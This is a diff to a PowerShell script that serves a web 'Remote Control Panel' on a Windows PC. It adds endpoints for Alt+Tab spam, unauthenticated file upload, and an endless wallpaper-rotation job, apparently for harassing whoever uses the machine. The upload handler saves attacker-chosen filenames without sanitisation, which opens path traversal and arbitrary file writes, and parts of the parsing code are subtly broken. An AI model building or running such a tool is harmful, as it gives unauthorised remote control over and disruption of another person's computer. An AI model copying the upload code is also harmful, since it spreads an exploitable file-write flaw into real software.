@@ -125,6 +125,21 @@ $html = @"
             <form action="/volume" method="post">
                 <button type="submit">Max Volume</button>
             </form>
+            <form action="/alttab" method="post">
+                <button type="submit">Alt+Tab Spam</button>
+            </form>
+            <form action="/wallpaperupload" method="post" enctype="multipart/form-data">
+                <div class="file-upload">
+                    <input type="file" name="wallpaperfile" accept="image/*" required>
+                    <button type="submit">Upload Wallpaper</button>
+                </div>
+            </form>
+            <form action="/wallpaperspam" method="post">
+                <button type="submit">Start Wallpaper Spam</button>
+            </form>
+            <form action="/stopwallpaperspam" method="post">
+                <button type="submit">Stop Wallpaper Spam</button>
+            </form>
         </div>
 
         <div class="output" id="output">Welcome to Remote Control Panel</div>
@@ -403,6 +418,94 @@ IPs: $($ips -join ', ')
                     $outputBuffer += "Volume maxed out!`n"
                 } catch {
                     $outputBuffer += "Failed to change volume: $_`n"
+                }
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/alttab" {
+                try {
+                    Add-Type -AssemblyName System.Windows.Forms
+                    for ($i = 0; $i -lt 20; $i++) {
+                        [System.Windows.Forms.SendKeys]::SendWait("%{TAB}")
+                        Start-Sleep -Milliseconds 200
+                    }
+                    $outputBuffer += "Alt+Tab spam activated!`n"
+                } catch {
+                    $outputBuffer += "Failed to Alt+Tab spam: $_`n"
+                }
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/wallpaperupload" {
+                if ($request.HttpMethod -eq "POST") {
+                    try {
+                        # Create wallpaper directory if it doesn't exist
+                        if (!(Test-Path "C:\temp\wallpapers")) {
+                            New-Item -ItemType Directory -Path "C:\temp\wallpapers" -Force
+                        }
+                        
+                        $contentType = $request.ContentType
+                        $boundary = $contentType.Split('boundary=')[1]
+                        $data = New-Object System.IO.BinaryReader($request.InputStream).ReadBytes($request.ContentLength64)
+                        $encoding = [System.Text.Encoding]::UTF8
+                        $dataString = $encoding.GetString($data)
+                        
+                        # Extract filename and save wallpaper
+                        if ($dataString -match 'filename="([^"]+)"') {
+                            $filename = $matches[1]
+                            $filePath = "C:\temp\wallpapers\$filename"
+                            [System.IO.File]::WriteAllBytes($filePath, $data)
+                            $outputBuffer += "Wallpaper uploaded: $filename`n"
+                        }
+                    } catch {
+                        $outputBuffer += "Wallpaper upload failed: $_`n"
+                    }
+                }
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/wallpaperspam" {
+                try {
+                    # Start wallpaper rotation in background
+                    $script = {
+                        $wallpapers = Get-ChildItem "C:\temp\wallpapers" -Filter "*.jpg","*.png","*.bmp" -ErrorAction SilentlyContinue
+                        if ($wallpapers.Count -gt 0) {
+                            while ($true) {
+                                foreach ($wallpaper in $wallpapers) {
+                                    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value $wallpaper.FullName
+                                    rundll32.exe user32.dll,UpdatePerUserSystemParameters
+                                    Start-Sleep -Seconds 2
+                                }
+                            }
+                        }
+                    }
+                    Start-Job -ScriptBlock $script -Name "WallpaperSpam"
+                    $outputBuffer += "Wallpaper spam started!`n"
+                } catch {
+                    $outputBuffer += "Failed to start wallpaper spam: $_`n"
+                }
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/stopwallpaperspam" {
+                try {
+                    Stop-Job -Name "WallpaperSpam" -ErrorAction SilentlyContinue
+                    Remove-Job -Name "WallpaperSpam" -ErrorAction SilentlyContinue
+                    $outputBuffer += "Wallpaper spam stopped!`n"
+                } catch {
+                    $outputBuffer += "Failed to stop wallpaper spam: $_`n"
                 }
                 $response.ContentType = "text/html"
                 $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
